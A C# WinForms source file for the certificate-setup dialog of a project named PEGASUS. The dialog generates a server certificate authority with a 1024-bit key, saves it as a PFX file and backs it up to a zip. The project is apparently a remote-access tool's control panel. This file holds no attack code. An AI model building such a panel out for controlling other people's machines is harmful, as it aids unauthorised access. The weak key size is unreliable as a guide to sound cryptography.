using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using PEGASUS;
using PEGASUS.Helper;


public class FormCertificate : Form
{
	private IContainer components;

	private Label label1;

	private Guna2PictureBox guna2PictureBox1;

	private Guna2GradientButton button1;

	private Guna2TextBox textBox1;

	private Guna2Panel guna2Panel1;

	private Label label2;

	private PictureBox pictureBox1;

	private Guna2BorderlessForm guna2BorderlessForm1;

	private Guna2Separator guna2Separator1;

	public FormCertificate()
	{
		InitializeComponent();
	}

	private void FormCertificate_Load(object sender, EventArgs e)
	{
		try
		{
			string text = Application.StartupPath + "\\BackupCertificate.zip";
			if (File.Exists(text))
			{
				MessageBox.Show(this, "Found a zip backup, Extracting (BackupCertificate.zip)", "Certificate backup", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				ZipFile.ExtractToDirectory(text, Path.GetTempPath());
				Settings.PEGASUSCertificate = new X509Certificate2(Settings.CertificatePath);
				Close();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, ex.Message, "Certificate", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}
	}

	private async void Button1_Click(object sender, EventArgs e)
	{
		try
		{
			if (string.IsNullOrWhiteSpace(textBox1.Text))
			{
				return;
			}
			button1.Text = "Please wait";
			button1.Enabled = false;
			textBox1.Enabled = false;
			Exception ex2;
			await Task.Run(delegate
			{
				try
				{
					string archiveFileName = Path.GetTempPath() + "\\BackupCertificate.zip";
					Settings.PEGASUSCertificate = CreateCertificate.CreateCertificateAuthority(textBox1.Text, 1024);
					File.WriteAllBytes(Settings.CertificatePath, Settings.PEGASUSCertificate.Export(X509ContentType.Pfx));
					using (ZipArchive destination = ZipFile.Open(archiveFileName, ZipArchiveMode.Create))
					{
						destination.CreateEntryFromFile(Settings.CertificatePath, Path.GetFileName(Settings.CertificatePath));
					}
					Program.form1.listView1.BeginInvoke((MethodInvoker)delegate
					{
						MessageBox.Show(this, "Remember to save the BackupCertificate.zip", "Certificate", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
						Close();
					});
				}
				catch (Exception ex3)
				{
					ex2 = ex3;
					Program.form1.listView1.BeginInvoke((MethodInvoker)delegate
					{
						MessageBox.Show(this, ex2.Message, "Certificate", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
						button1.Text = "OK";
						button1.Enabled = true;
						textBox1.Enabled = true;
					});
				}
			});
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, ex.Message, "Certificate", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			button1.Text = "Ok";
			button1.Enabled = true;
		}
	}

	private void guna2PictureBox1_Click(object sender, EventArgs e)
	{
		Close();
	}

	[DllImport("user32.DLL")]
	private static extern void ReleaseCapture();

	[DllImport("user32.DLL")]
	private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

	private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
	{
		ReleaseCapture();
		SendMessage(base.Handle, 274, 61458, 0);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormCertificate));
		label1 = new System.Windows.Forms.Label();
		guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
		button1 = new Guna.UI2.WinForms.Guna2GradientButton();
		textBox1 = new Guna.UI2.WinForms.Guna2TextBox();
		guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
		guna2Separator1 = new Guna.UI2.WinForms.Guna2Separator();
		pictureBox1 = new System.Windows.Forms.PictureBox();
		label2 = new System.Windows.Forms.Label();
		guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
		((System.ComponentModel.ISupportInitialize)guna2PictureBox1).BeginInit();
		guna2Panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
		SuspendLayout();
		label1.AutoSize = true;
		label1.Location = new System.Drawing.Point(161, 141);
		label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		label1.Name = "label1";
		label1.Size = new System.Drawing.Size(72, 13);
		label1.TabIndex = 0;
		label1.Text = "Server Name:";
		guna2PictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		guna2PictureBox1.BackColor = System.Drawing.Color.Transparent;
		guna2PictureBox1.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox1.Image");
		guna2PictureBox1.ImageRotate = 0f;
		guna2PictureBox1.Location = new System.Drawing.Point(558, 12);
		guna2PictureBox1.Name = "guna2PictureBox1";
		guna2PictureBox1.ShadowDecoration.Parent = guna2PictureBox1;
		guna2PictureBox1.Size = new System.Drawing.Size(29, 27);
		guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		guna2PictureBox1.TabIndex = 7;
		guna2PictureBox1.TabStop = false;
		guna2PictureBox1.UseTransparentBackground = true;
		guna2PictureBox1.Click += new System.EventHandler(guna2PictureBox1_Click);
		button1.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
		button1.BorderThickness = 1;
		button1.CheckedState.Parent = button1;
		button1.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		button1.CustomImages.Parent = button1;
		button1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		button1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		button1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		button1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		button1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		button1.DisabledState.Parent = button1;
		button1.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		button1.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
		button1.Font = new System.Drawing.Font("Electrolize", 9f);
		button1.ForeColor = System.Drawing.Color.White;
		button1.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
		button1.HoverState.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		button1.HoverState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		button1.HoverState.ForeColor = System.Drawing.Color.LightGray;
		button1.HoverState.Parent = button1;
		button1.Location = new System.Drawing.Point(164, 196);
		button1.Name = "button1";
		button1.ShadowDecoration.Parent = button1;
		button1.Size = new System.Drawing.Size(244, 30);
		button1.TabIndex = 10;
		button1.Text = "Ok";
		button1.Click += new System.EventHandler(Button1_Click);
		textBox1.Animated = true;
		textBox1.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		textBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
		textBox1.DefaultText = "PEGASUS Server";
		textBox1.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		textBox1.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		textBox1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		textBox1.DisabledState.Parent = textBox1;
		textBox1.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		textBox1.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		textBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		textBox1.FocusedState.Parent = textBox1;
		textBox1.Font = new System.Drawing.Font("Electrolize", 9f);
		textBox1.ForeColor = System.Drawing.Color.White;
		textBox1.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		textBox1.HoverState.Parent = textBox1;
		textBox1.Location = new System.Drawing.Point(163, 163);
		textBox1.Name = "textBox1";
		textBox1.PasswordChar = '\0';
		textBox1.PlaceholderText = "";
		textBox1.SelectedText = "";
		textBox1.SelectionStart = 12;
		textBox1.ShadowDecoration.Parent = textBox1;
		textBox1.Size = new System.Drawing.Size(244, 20);
		textBox1.TabIndex = 9;
		guna2Panel1.Controls.Add(guna2Separator1);
		guna2Panel1.Controls.Add(pictureBox1);
		guna2Panel1.Controls.Add(label2);
		guna2Panel1.Dock = System.Windows.Forms.DockStyle.Top;
		guna2Panel1.Location = new System.Drawing.Point(0, 0);
		guna2Panel1.Name = "guna2Panel1";
		guna2Panel1.ShadowDecoration.Parent = guna2Panel1;
		guna2Panel1.Size = new System.Drawing.Size(599, 67);
		guna2Panel1.TabIndex = 11;
		guna2Panel1.MouseDown += new System.Windows.Forms.MouseEventHandler(guna2Panel1_MouseDown);
		guna2Separator1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		guna2Separator1.BackColor = System.Drawing.Color.Transparent;
		guna2Separator1.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
		guna2Separator1.Location = new System.Drawing.Point(-350, 61);
		guna2Separator1.Name = "guna2Separator1";
		guna2Separator1.Size = new System.Drawing.Size(1299, 10);
		guna2Separator1.TabIndex = 13;
		guna2Separator1.UseTransparentBackground = true;
		pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
		pictureBox1.Location = new System.Drawing.Point(12, 12);
		pictureBox1.Name = "pictureBox1";
		pictureBox1.Size = new System.Drawing.Size(40, 42);
		pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		pictureBox1.TabIndex = 12;
		pictureBox1.TabStop = false;
		label2.AutoSize = true;
		label2.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		label2.Location = new System.Drawing.Point(236, 20);
		label2.Name = "label2";
		label2.Size = new System.Drawing.Size(97, 19);
		label2.TabIndex = 11;
		label2.Text = "Certificate";
		guna2BorderlessForm1.ContainerControl = this;
		guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		base.ClientSize = new System.Drawing.Size(599, 312);
		base.ControlBox = false;
		base.Controls.Add(button1);
		base.Controls.Add(textBox1);
		base.Controls.Add(guna2PictureBox1);
		base.Controls.Add(label1);
		base.Controls.Add(guna2Panel1);
		ForeColor = System.Drawing.Color.LightGray;
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Margin = new System.Windows.Forms.Padding(2);
		base.Name = "FormCertificate";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		Text = "Certificate";
		base.Load += new System.EventHandler(FormCertificate_Load);
		((System.ComponentModel.ISupportInitialize)guna2PictureBox1).EndInit();
		guna2Panel1.ResumeLayout(false);
		guna2Panel1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
		ResumeLayout(false);
		PerformLayout();
	}
}
